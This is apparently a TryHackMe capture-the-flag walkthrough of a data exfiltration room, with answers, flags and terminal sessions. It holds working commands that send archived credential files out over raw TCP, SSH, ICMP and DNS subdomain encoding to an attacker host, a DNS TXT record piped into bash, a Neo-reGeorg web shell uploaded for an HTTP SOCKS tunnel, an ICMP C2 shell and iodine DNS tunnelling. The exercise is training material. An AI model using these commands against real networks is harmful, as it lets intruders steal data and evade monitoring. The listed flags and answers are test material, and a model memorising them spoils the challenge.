# Data Exfiltration

## Task 1  Introduction
+ Learning Objectives
    - What is Data exfiltration?
    - Understand data exfiltration types and how they can be used.
    - Practice data exfiltration over protocols: Sockets, SSH, ICMP, HTTP(s), and DNS.
    - Practice C2 communications over various protocols.
    - Practice establishing Tunneling over DNS and HTTP.

## Task 2  Network Infrastructure
+ Deploy the VM
Machine IP: 10.10.223.157
Username: thm
Password: tryhackme

ssh thm@10.10.223.157

## Task 3  Data Exfiltration
+ In which case scenario will sending and receiving traffic continue during the connection?`tunnelling`
+ In which case scenario will sending and receiving traffic be in one direction?`traditional Data Exfiltration`
+ In the next task, we will be discussing how data exfiltration over the TCP socket works! `No Answer Needed`

## Task 4  Exfiltration using TCP socket
+ Exfiltration using TCP sockets relies on ____________ protocols! `non-standard`
+ Now apply what we discussed to exfiltrate data over the TCP socket! Once you exfiltrate data successfully, hit Completed to move on to the next task!`No Answer Needed`


+ On JumpBox
```bash
thm@jump-box:~$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on 0.0.0.0 8080
Connection received on victim-thm1.thm-pri-net 51220
```

+ On the Victim
```bash
thm@victim1:~$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
0+1 records in
0+1 records out
244 bytes copied, 0.115765 s, 2.1 kB/s
```
+ Check Data Exfiltered on jumpbox
```bash
thm@jump-box:~$ cd /tmp
thm@jump-box:/tmp$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
0+1 records in
0+1 records out
244 bytes copied, 0.000211677 s, 1.2 MB/s
thm@jump-box:/tmp$ ls
task4-creds.data  task4-creds.tar
thm@jump-box:/tmp$ tar xvf task4-creds.tar
task4/
task4/creds.txt
thm@jump-box:/tmp$ cat task4/creds.txt 
admin:password
Admin:123456
root:toor
```

## Task 5  Exfiltration using SSH
+ All packets sent using the Data Exfiltration technique over SSH are encrypted! (T=True/F=False)`T`
+ Replicate the steps to transfer data over the SSH client. Once you transfer the file successfully, hit Completed and move on to the next task!`No Answer Needed`

+ From victim1 `
```bash
thm@victim1:~$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
The authenticity of host 'jump.thm.com (192.168.0.133)' can't be established.
ECDSA key fingerprint is SHA256:Ks0kFNo7GTsv8uM8bW78FwCCXjvouzDDmATnx1NhbIs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'jump.thm.com,192.168.0.133' (ECDSA) to the list of known hosts.
thm@jump.thm.com's password:
```
+ On JumpBox thereis data was exfilltered
```bash
thm@jump-box:/tmp$ cat task5/creds.txt 
admin:password
Admin:123456
root:toor
```

## Task 6  Exfiltrate using HTTP(S)
+ Check the Apache log file on web.thm.com  and get the flag!`THM{H77P-G37-15-f0un6}`
+ When you visit the http://flag.thm.com/flag website through the uploader machine via the HTTP tunneling technique, what is the flag?

```bash
thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm: 
192.168.0.133 - - [29/Apr/2022:11:41:54 +0100] "GET /example.php?flag=VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= HTTP/1.1" 200 495 "-" "curl/7.68.0"
192.168.0.133 - - [29/Apr/2022:11:42:14 +0100] "POST /example.php HTTP/1.1" 200 395 "-" "curl/7.68.0"
192.168.0.1 - - [20/Jun/2022:06:18:35 +0100] "GET /test.php HTTP/1.1" 200 195 "-" "curl/7.68.0"
```
+ Start HTTP Tunnelling
```bash
root@ip-10-10-251-99:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
```

+ Upload the file `tunnel.php` on url `http://10.10.223.157/uploader/index.php` and start server on the attackbox
```bash
root@ip-10-10-251-99:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.223.157/uploader/files/tunnel.php


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/Neo-reGeorg

+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting SOCKS5 server [127.0.0.1:1080]
  Tunnel at:
    http://10.10.223.157/uploader/files/tunnel.php
+------------------------------------------------------------------------+
```
+ After our server tunneling then browse the ip for the webserver `http://flag.thm.com/flag` by using ping
```bash
thm@web-thm:~$ ping flag.thm.com
PING flag.thm.com (172.20.0.120) 56(84) bytes of data.
```

+ When we know the ip is `172.20.0.120` then call it using proxy on sock5 to get the flag on port `80`
```bash
root@ip-10-10-251-99:/opt/Neo-reGeorg# curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
<p>Your flag: THM{H77p_7unn3l1n9_l1k3_l337}</p>root@ip-10-10-251-99:/opt/Neo-reGeorg#
```

## Task 7  Exfiltration using ICMP
+ In which ICMP packet section can we include our data?`Data`
+ Follow the technique discussed in this task to establish a C2 ICMP connection between JumpBox and ICMP-Host. Then execute the "getFlag" command. What is the flag?`THM{g0t-1cmp-p4k3t!}`


+ Setup the MSFCONSOLE
```bash
msf6 > use auxiliary/server/icmp_exfil
msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src 10.10.251.99
BPF_FILTER => icmp and not src 10.10.251.99
msf6 auxiliary(server/icmp_exfil) > set INTERFACE ens5
INTERFACE => ens5
msf6 auxiliary(server/icmp_exfil) > run

[*] ICMP Listener started on ens5 (10.10.116.172). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
```
+ Send packet from `icmp.thm.com` using nping
```bash
thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.116.172 --data-string "admin:password"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2024-02-09 11:10 EET
SENT (0.0340s) ICMP [192.168.0.121 > 10.10.116.172 Echo request (type=8/code=0) id=27751 seq=1] IP [ttl=64 id=43556 iplen=42 ]
RCVD (0.0346s) ICMP [10.10.116.172 > 192.168.0.121 Echo reply (type=0/code=0) id=27751 seq=1] IP [ttl=63 id=16692 iplen=42 ]
 
Max rtt: 0.517ms | Min rtt: 0.517ms | Avg rtt: 0.517ms
Raw packets sent: 1 (42B) | Rcvd: 1 (42B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds


thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.116.172 --data-string "BOFfile.txt"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2024-02-09 11:12 EET
SENT (0.0336s) ICMP [192.168.0.121 > 10.10.116.172 Echo request (type=8/code=0) id=45152 seq=1] IP [ttl=64 id=9217 iplen=39 ]
RCVD (0.0342s) ICMP [10.10.116.172 > 192.168.0.121 Echo reply (type=0/code=0) id=45152 seq=1] IP [ttl=63 id=49177 iplen=39 ]
RCVD (0.0788s) ICMP [10.10.116.172 > 192.168.0.121 Echo reply (type=0/code=0) id=45152 seq=1] IP [ttl=31 id=7887 iplen=32 ]
 
Max rtt: 45.084ms | Min rtt: 0.426ms | Avg rtt: 22.755ms
Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2024-02-09 11:13 EET
SENT (0.0263s) ICMP [192.168.0.121 > 10.10.116.172 Echo request (type=8/code=0) id=9344 seq=1] IP [ttl=64 id=33721 iplen=42 ]
RCVD (0.0270s) ICMP [10.10.116.172 > 192.168.0.121 Echo reply (type=0/code=0) id=9344 seq=1] IP [ttl=63 id=52114 iplen=42 ]
RCVD (0.0640s) ICMP [10.10.116.172 > 192.168.0.121 Echo reply (type=0/code=0) id=9344 seq=1] IP [ttl=31 id=9112 iplen=30 ]
 
Max rtt: 37.558ms | Min rtt: 0.553ms | Avg rtt: 19.055ms
Raw packets sent: 1 (42B) | Rcvd: 2 (72B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds

thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.116.172 --data-string "admin2:password2"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2024-02-09 11:15 EET
SENT (0.0325s) ICMP [192.168.0.121 > 10.10.116.172 Echo request (type=8/code=0) id=19411 seq=1] IP [ttl=64 id=49666 iplen=44 ]
RCVD (0.0331s) ICMP [10.10.116.172 > 192.168.0.121 Echo reply (type=0/code=0) id=19411 seq=1] IP [ttl=63 id=61042 iplen=44 ]
RCVD (0.0714s) ICMP [10.10.116.172 > 192.168.0.121 Echo reply (type=0/code=0) id=19411 seq=1] IP [ttl=31 id=10678 iplen=30 ]
 
Max rtt: 38.849ms | Min rtt: 0.463ms | Avg rtt: 19.656ms
Raw packets sent: 1 (44B) | Rcvd: 2 (74B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds

thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.116.172 --data-string "EOF"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2024-02-09 11:17 EET
SENT (0.0305s) ICMP [192.168.0.121 > 10.10.116.172 Echo request (type=8/code=0) id=1612 seq=1] IP [ttl=64 id=31163 iplen=31 ]
RCVD (0.0310s) ICMP [10.10.116.172 > 192.168.0.121 Echo reply (type=0/code=0) id=1612 seq=1] IP [ttl=63 id=7443 iplen=31 ]
RCVD (0.2140s) ICMP [10.10.116.172 > 192.168.0.121 Echo reply (type=0/code=0) id=1612 seq=1] IP [ttl=31 id=25204 iplen=36 ]
 
Max rtt: 183.505ms | Min rtt: 0.457ms | Avg rtt: 91.981ms
Raw packets sent: 1 (31B) | Rcvd: 2 (67B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds
```

+ after ping complete on attackbox we get loot
```bash
[+] Beginning capture of "file.txt" data
[*] 30 bytes of data recevied in total
[+] End of File received. Saving "file.txt" to loot
[+] Incoming file "file.txt" saved to loot
[+] Loot filename: /root/.msf4/loot/20240209091722_default_10.10.116.172_icmp_exfil_622480.txt
```

+ Using C2 ICMP
```bash
thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133

thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 192.168.0.121
[sudo] password for thm: 
shell: hostname
hostname
shell: icmp-host
getFlag
getFlag
shell: [+] Check the flag: /tmp/flag.txt


thm@icmp-host:~$ cat /tmp/flag.txt
THM{g0t-1cmp-p4k3t!}
```

## Task 8  DNS Configurations
+ Once the DNS configuration works fine, resolve the flag.thm.com  domain name. What is the IP address?`172.20.0.120`

## Task 9  Exfiltration over DNS
+ What is the maximum length for the subdomain name (label)?`63`
+ The Fully Qualified FQDN domain name must not exceed ______ characters.`255`
+ Execute the C2 communication over the DNS protocol of the flag.tunnel.com. What is the flag?`THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}`


+ SSH to jumpbox and hop to `attacker.thm.com` on attacker tcpdump over DNS (udp port 53)
```bash
thm@attacker:~$ sudo tcpdump -i eth0 udp port 53
[sudo] password for thm: 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
```
```bash
thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
TmFtZTogVEhNLXVzZX.att.tunnel.com
IKQWRkcmVzczogMTIz.att.tunnel.com
NCBJbnRlcm5ldCwgVE.att.tunnel.com
hNCkNyZWRpdCBDYXJk.att.tunnel.com
OiAxMjM0LTEyMzQtMT.att.tunnel.com
IzNC0xMjM0CkV4cGly.att.tunnel.com
ZTogMDUvMDUvMjAyMg.att.tunnel.com
pDb2RlOiAxMzM3Cg==.att.tunnel.com

thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com
thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash

```

```bash
12:41:51.241520 IP 172.20.0.1.47864 > attacker.domain: 12148% [1au] A? _.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (76)
12:41:51.242153 IP attacker.60874 > 172.20.0.1.domain: 26088+ PTR? 1.0.20.172.in-addr.arpa. (41)
12:41:51.242279 IP 172.20.0.1.45491 > attacker.domain: 55770% [1au] A? TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (207)
12:41:51.242783 IP 172.20.0.1.domain > attacker.60874: 26088 NXDomain* 0/1/0 (95)

thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
Name: THM-user
Address: 1234 Internet, THM
Credit Card: 1234-1234-1234-1234
Expire: 05/05/2022
Code: 1337


thm@victim2:~$ dig +short -t TXT flag.tunnel.com | tr -d "\"" | base64 -d | bash
THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}

```

## Task 10  DNS Tunneling
+ When the iodine connection establishes to Attacker, run the ifconfig command. How many interfaces are? (including the loopback interface)`4`
+ What is the network interface name created by iodined?`dns0`
+  Use the DNS tunneling to prove your access to the webserver, http://192.168.0.100/test.php . What is the flag?`THM{DN5-Tunn311n9-1s-c00l}`


+ Open tunnel from attacker
```bash
thm@attacker:~$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com
Opened dns0
Setting IP of dns0 to 10.1.1.1
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Listening to dns for domain att.tunnel.com

thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com 
Opened dns0
Opened IPv4 UDP socket
Sending DNS queries for att.tunnel.com to 127.0.0.11
Autodetecting DNS query type (use -T to override).
Using DNS type NULL queries
Version ok, both using protocol v 0x00000502. You are user #0
Setting IP of dns0 to 10.1.1.2
Setting MTU of dns0 to 1130
Server tunnel IP is 10.1.1.1
Testing raw UDP data to the server (skip with -r)
Server is at 172.20.0.200, trying raw login: OK
Sending raw traffic directly to 172.20.0.200
Connection setup complete, transmitting data.
Detaching from terminal...

```